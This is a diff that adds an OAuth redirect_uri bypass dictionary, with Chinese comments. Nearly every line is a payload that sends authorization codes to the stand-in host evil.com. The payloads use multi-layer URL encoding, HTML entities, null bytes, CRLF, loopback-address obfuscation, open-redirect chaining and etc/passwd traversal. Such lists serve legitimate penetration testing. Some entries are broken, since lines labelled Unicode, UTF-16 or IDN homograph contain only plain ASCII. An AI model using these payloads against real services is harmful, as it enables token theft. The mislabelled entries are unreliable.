@@ -1,0 +1,188 @@
+# OAuth Redirect URI - Encoding Variations Attack Dictionary
+# 编码变异攻击模式 - 利用不同编码方式绕过redirect_uri验证
+# 用于测试目标是否正确解码和验证redirect_uri参数
+
+# URL编码 - 单编码
+https%3A%2F%2Fevil.com%2Fcallback
+https%3a%2f%2fevil.com%2fcallback
+http%3A%2F%2Ftarget.com%2Fcallback
+http%3a%2f%2ftarget.com%2fcallback
+
+# URL编码 - 双编码
+https%253A%252F%252Fevil.com%252Fcallback
+https%253a%252f%252fevil.com%252fcallback
+http%253A%252F%252Ftarget.com%252Fcallback
+
+# URL编码 - 三编码
+https%25253A%25252F%25252Fevil.com%25252Fcallback
+
+# URL编码 - 部分编码
+https://evil.com%2Fcallback
+https%3A//evil.com/callback
+https://evil.com/callback%3Fcode%3D123
+https://evil.com/callback%3fcode%3d123
+
+# URL编码 - 域名编码
+https%3A%2F%2F%65%76%69%6C%2E%63%6F%6D%2F%63%61%6C%6C%62%61%63%6B
+https%3a%2f%2f%65%76%69%6c%2e%63%6f%6d%2f%63%61%6c%6c%62%61%63%6b
+
+# URL编码 - 混合大小写
+hTtPs%3A%2F%2FeViL.cOm%2FcAlLbAcK
+HtTpS%3a%2f%2FeViL.CoM%2FcAlLbAcK
+
+# HTML实体编码
+https://evil.com/callback?code=&quot;123&quot;
+https://evil.com/callback?code=&#34;123&#34;
+https://evil.com/callback?code=&#x22;123&#x22;
+https://evil.com/callback?code=&amp;state=abc
+https://evil.com/callback?code=&#38;state=abc
+
+# Unicode编码
+https://evil.com/callback (U+0068 U+0074 U+0074 U+0070 U+0073)
+https://evil.com/callback (U+FF48 U+FF54 U+FF54 U+FF50 U+FF53)
+https://evil.com/callback (U+043D U+0442 U+0442 U+0440 U+0441)
+
+# Unicode规范化
+https://evil.com/callback (NFC)
+https://evil.com/callback (NFD)
+https://evil.com/callback (NFKC)
+https://evil.com/callback (NFKD)
+
+# UTF-7编码
++AGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBjAGEAbABsAGIAYQBjAGs-
++AGgAdAB0AHAAOgAvAC8AdABhAHIAZwBlAHQALgBjAG8AbQAvAGMAYQBsAGwAYgBhAGMAaw-
+
+# UTF-16编码
+https://evil.com/callback (UTF-16BE)
+https://evil.com/callback (UTF-16LE)
+
+# Base64编码
+aHR0cHM6Ly9ldmlsLmNvbS9jYWxsYmFjaw==
+aHR0cDovL3RhcmdldC5jb20vY2FsbGJhY2s=
+
+# Base64 URL编码
+aHR0cHM6Ly9ldmlsLmNvbS9jYWxsYmFjaw
+aHR0cDovL3RhcmdldC5jb20vY2FsbGJhY2s
+
+# 百分比编码变体
+https://evil.com/callback?code=%31%32%33
+https://evil.com/callback?code=%31%32%33&state=%61%62%63
+https://evil.com/callback?code=1%25323
+https://evil.com/callback?code=12%2533
+
+# 空字节编码
+https://evil.com/callback%00
+https://evil.com/callback%00?code=123
+https://evil.com/callback?code=123%00
+https://evil.com/callback?code=123%00&state=abc
+
+# 换行符编码
+https://evil.com/callback%0a
+https://evil.com/callback%0d
+https://evil.com/callback%0d%0a
+https://evil.com/callback%0a%0d
+
+# Tab符编码
+https://evil.com/callback%09
+https://evil.com/callback%09?code=123
+
+# 反斜杠编码
+https://evil.com/callback%5c
+https://evil.com/callback%5C
+https://evil.com/callback%255c
+https://evil.com/callback%255C
+
+# 正斜杠编码
+https://evil.com/callback%2f
+https://evil.com/callback%2F
+https://evil.com/callback%252f
+https://evil.com/callback%252F
+
+# 问号编码
+https://evil.com/callback%3fcode=123
+https://evil.com/callback%3Fcode=123
+https://evil.com/callback%253fcode=123
+https://evil.com/callback%253Fcode=123
+
+# 等号编码
+https://evil.com/callback?code%3d123
+https://evil.com/callback?code%3D123
+https://evil.com/callback?code%253d123
+https://evil.com/callback?code%253D123
+
+# 与号编码
+https://evil.com/callback?code=123%26state=abc
+https://evil.com/callback?code=123%26state=abc
+https://evil.com/callback?code=123%2526state=abc
+
+# 井号编码
+https://evil.com/callback%23token=123
+https://evil.com/callback%23token=123
+https://evil.com/callback%2523token=123
+
+# 分号编码
+https://evil.com/callback%3bcode=123
+https://evil.com/callback%3Bcode=123
+
+# 逗号编码
+https://evil.com/callback%2ccode=123
+https://evil.com/callback%2Ccode=123
+
+# 加号编码
+https://evil.com/callback%2bcode=123
+https://evil.com/callback%2Bcode=123
+
+# 空格编码
+https://evil.com/callback%20
+https://evil.com/callback+
+https://evil.com/callback%2520
+
+# 混合编码 - URL + HTML
+https%3A%2F%2Fevil.com%2Fcallback%3Fcode%3D&#34;123&#34;
+
+# 混合编码 - URL + Unicode
+https%3A%2F%2Fevil.com%2Fcallback (U+0063 U+006F U+0064 U+0065)
+
+# 混合编码 - 多重URL编码
+https%25253A%25252F%25252Fevil.com%25252Fcallback%25253Fcode%25253D123
+
+# 混合编码 - URL + Base64
+https%3A%2F%2Fevil.com%2Fcallback?aHR0cHM6Ly9ldmlsLmNvbS9jYWxsYmFjaw==
+
+# 域名编码变体
+https://xn--e1afmkfd.xn--p1ai/callback (国际化域名)
+https://例え.jp/callback (国际化域名)
+https://中国.cn/callback (国际化域名)
+https://target.com/callback (IDN同形异义)
+https://target.com/callback (IDN同形异义)
+https://target.com/callback (IDN同形异义)
+
+# IP地址编码变体
+https://127.0.0.1/callback
+https://0x7f000001/callback
+https://2130706433/callback
+https://0177.0.0.1/callback
+https://0x7f.0.0.1/callback
+https://127.1/callback
+https://0/callback
+https://0x7f000001/callback
+
+# IPv6编码变体
+https://[::1]/callback
+https://[0:0:0:0:0:0:0:1]/callback
+https://[0000:0000:0000:0000:0000:0000:0000:0001]/callback
+https://[::ffff:127.0.0.1]/callback
+
+# 编码+路径遍历组合
+https://evil.com/callback%2f..%2f..%2fetc%2fpasswd
+https://evil.com/callback%2F..%2F..%2Fetc%2Fpasswd
+https://evil.com/callback%252f..%252f..%252fetc%252fpasswd
+
+# 编码+开放重定向组合
+https://target.com/redirect?url=https%3A%2F%2Fevil.com%2Fcallback
+https://target.com/redirect?url=https%3a%2f%2fevil.com%2fcallback
+
+# 编码+子域名组合
+https://dev.target.com/callback%3Fcode%3D123
+https://staging.target.com/callback%3Fcode%3D123
+https://test.target.com/callback%3Fcode%3D123
